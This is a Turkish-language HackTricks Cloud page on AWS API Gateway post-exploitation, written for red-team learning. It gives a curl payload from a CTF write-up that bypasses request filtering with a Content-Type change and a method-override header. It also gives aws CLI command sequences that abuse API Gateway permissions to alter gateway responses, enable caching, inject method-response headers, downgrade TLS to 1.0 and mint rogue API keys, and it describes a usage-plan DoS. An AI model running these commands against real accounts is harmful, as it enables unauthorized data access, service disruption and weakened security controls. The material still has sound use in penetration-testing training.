# AWS - API Gateway Post Exploitation

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **HackTricks'e PR göndererek hacking ipuçlarını paylaşın** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>
{% endhint %}

## API Gateway

Daha fazla bilgi için kontrol edin:

{% content-ref url="../aws-services/aws-api-gateway-enum.md" %}
[aws-api-gateway-enum.md](../aws-services/aws-api-gateway-enum.md)
{% endcontent-ref %}

### Açığa Çıkmamış API'lere Erişim

[https://us-east-1.console.aws.amazon.com/vpc/home#CreateVpcEndpoint](https://us-east-1.console.aws.amazon.com/vpc/home?region=us-east-1#CreateVpcEndpoint:) adresinde `com.amazonaws.us-east-1.execute-api` servisi ile bir endpoint oluşturabilirsiniz, bu endpoint'i erişiminizin olduğu bir ağda (potansiyel olarak bir EC2 makinesi aracılığıyla) açığa çıkarabilir ve tüm bağlantılara izin veren bir güvenlik grubu atayabilirsiniz.\
Daha sonra, EC2 makinesinden endpoint'e erişebilir ve daha önce açığa çıkmamış olan gateway API'sini çağırabilirsiniz.

### İstek Gövdesi Passthrough'u Atlatma

Bu teknik [**bu CTF yazısında**](https://blog-tyage-net.translate.goog/post/2023/2023-09-03-midnightsun/?\_x\_tr\_sl=en&\_x\_tr\_tl=es&\_x\_tr\_hl=en&\_x\_tr\_pto=wapp) bulunmuştur.

[**AWS dokümantasyonunda**](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-apigateway-method-integration.html) `PassthroughBehavior` bölümünde belirtildiği gibi, varsayılan olarak, **`WHEN_NO_MATCH`** değeri, isteğin **Content-Type** başlığını kontrol ederken, isteği dönüşüm yapmadan arka uca iletecektir.

Bu nedenle, CTF'de API Gateway, `Content-Type: application/json` ile bir istek gönderildiğinde bir yanıt içinde bayrağın sızdırılmasını **önleyen** bir entegrasyon şablonuna sahipti:

{% code overflow="wrap" %}
```yaml
RequestTemplates:
application/json: '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename=:moviename","FilterExpression": "not contains(#description, :flagstring)","ExpressionAttributeNames": {"#description": "description"},"ExpressionAttributeValues":{":moviename":{"S":"$util.escapeJavaScript($input.params(''moviename''))"},":flagstring":{"S":"midnight"}}}'
```
{% endcode %}

Ancak, **`Content-type: text/json`** ile bir istek göndermek bu filtreyi engeller.&#x20;

Son olarak, API Gateway sadece `Get` ve `Options`'a izin verdiğinden, gövdede sorgu ile bir POST isteği göndererek ve `X-HTTP-Method-Override: GET` başlığını kullanarak herhangi bir sınırlama olmadan rastgele bir dynamoDB sorgusu göndermek mümkündü:

{% code overflow="wrap" %}
```bash
curl https://vu5bqggmfc.execute-api.eu-north-1.amazonaws.com/prod/movies/hackers -H 'X-HTTP-Method-Override: GET' -H 'Content-Type: text/json'  --data '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename = :moviename","ExpressionAttributeValues":{":moviename":{"S":"hackers"}}}'
```
{% endcode %}

### Usage Plans DoS

**Enumeration** bölümünde, anahtarların **kullanım planını nasıl elde edeceğinizi** görebilirsiniz. Eğer anahtara sahipseniz ve bu anahtar **ayda X kullanım ile sınırlıysa**, **sadece kullanarak bir DoS saldırısına neden olabilirsiniz**.

**API Key** sadece **`x-api-key`** adlı bir **HTTP başlığı** içine **dahil edilmelidir**.

### `apigateway:UpdateGatewayResponse`, `apigateway:CreateDeployment`

`apigateway:UpdateGatewayResponse` ve `apigateway:CreateDeployment` izinlerine sahip bir saldırgan, **mevcut bir Gateway Response'u, hassas bilgileri sızdıran veya kötü amaçlı scriptler çalıştıran özel başlıklar veya yanıt şablonları içerecek şekilde değiştirebilir**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
RESPONSE_TYPE="DEFAULT_4XX"

# Update the Gateway Response
aws apigateway update-gateway-response --rest-api-id $API_ID --response-type $RESPONSE_TYPE --patch-operations op=replace,path=/responseTemplates/application~1json,value="{\"message\":\"$context.error.message\", \"malicious_header\":\"malicious_value\"}"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Potansiyel Etki**: Hassas bilgilerin sızması, kötü amaçlı komut dosyalarının çalıştırılması veya API kaynaklarına yetkisiz erişim.

{% hint style="info" %}
Test edilmesi gerekiyor
{% endhint %}

### `apigateway:UpdateStage`, `apigateway:CreateDeployment`

`apigateway:UpdateStage` ve `apigateway:CreateDeployment` izinlerine sahip bir saldırgan, **mevcut bir API Gateway aşamasını farklı bir aşamaya yönlendirmek veya önbellek ayarlarını değiştirerek önbelleğe alınmış verilere yetkisiz erişim sağlamak için değiştirebilir**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
STAGE_NAME="Prod"

# Update the API Gateway stage
aws apigateway update-stage --rest-api-id $API_ID --stage-name $STAGE_NAME --patch-operations op=replace,path=/cacheClusterEnabled,value=true,op=replace,path=/cacheClusterSize,value="0.5"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Potansiyel Etki**: Yetkisiz erişim ile önbelleğe alınmış verilere ulaşma, API trafiğini kesintiye uğratma veya engelleme.

{% hint style="info" %}
Test edilmesi gerekiyor
{% endhint %}

### `apigateway:PutMethodResponse`, `apigateway:CreateDeployment`

`apigateway:PutMethodResponse` ve `apigateway:CreateDeployment` izinlerine sahip bir saldırgan, **mevcut bir API Gateway REST API metodunun yanıtını, hassas bilgileri sızdıran veya kötü amaçlı komut dosyalarını çalıştıran özel başlıklar veya yanıt şablonları içerecek şekilde değiştirebilir**.
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
STATUS_CODE="200"

# Update the method response
aws apigateway put-method-response --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --status-code $STATUS_CODE --response-parameters "method.response.header.malicious_header=true"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Potansiyel Etki**: Hassas bilgilerin sızması, kötü amaçlı komut dosyalarının çalıştırılması veya API kaynaklarına yetkisiz erişim.

{% hint style="info" %}
Test edilmesi gerekiyor
{% endhint %}

### `apigateway:UpdateRestApi`, `apigateway:CreateDeployment`

`apigateway:UpdateRestApi` ve `apigateway:CreateDeployment` izinlerine sahip bir saldırgan, **API Gateway REST API ayarlarını değiştirerek loglamayı devre dışı bırakabilir veya minimum TLS sürümünü değiştirebilir, bu da API'nin güvenliğini potansiyel olarak zayıflatabilir**.
```bash
API_ID="your-api-id"

# Update the REST API settings
aws apigateway update-rest-api --rest-api-id $API_ID --patch-operations op=replace,path=/minimumTlsVersion,value='TLS_1.0',op=replace,path=/apiKeySource,value='AUTHORIZER'

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Potansiyel Etki**: API'nin güvenliğini zayıflatmak, yetkisiz erişime veya hassas bilgilerin açığa çıkmasına neden olabilir.

{% hint style="info" %}
Test edilmesi gerekiyor
{% endhint %}

### `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, `apigateway:CreateUsagePlanKey`

`apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan` ve `apigateway:CreateUsagePlanKey` izinlerine sahip bir saldırgan, **yeni API anahtarları oluşturabilir, bunları kullanım planlarıyla ilişkilendirebilir ve ardından bu anahtarları API'lere yetkisiz erişim için kullanabilir**.
```bash
# Create a new API key
API_KEY=$(aws apigateway create-api-key --enabled --output text --query 'id')

# Create a new usage plan
USAGE_PLAN=$(aws apigateway create-usage-plan --name "MaliciousUsagePlan" --output text --query 'id')

# Associate the API key with the usage plan
aws apigateway create-usage-plan-key --usage-plan-id $USAGE_PLAN --key-id $API_KEY --key-type API_KEY
```
**Potansiyel Etki**: API kaynaklarına yetkisiz erişim, güvenlik kontrollerinin atlatılması.

{% hint style="info" %}
Test edilmesi gerekiyor
{% endhint %}

{% hint style="success" %}
AWS Hacking öğren ve pratik yap:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğren ve pratik yap: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekle</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol et!
* **💬 Discord grubuna** [**katıl**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katıl ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) **bizi takip et.**
* **HackTricks'e PR göndererek hacking ipuçlarını paylaş** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>
{% endhint %}
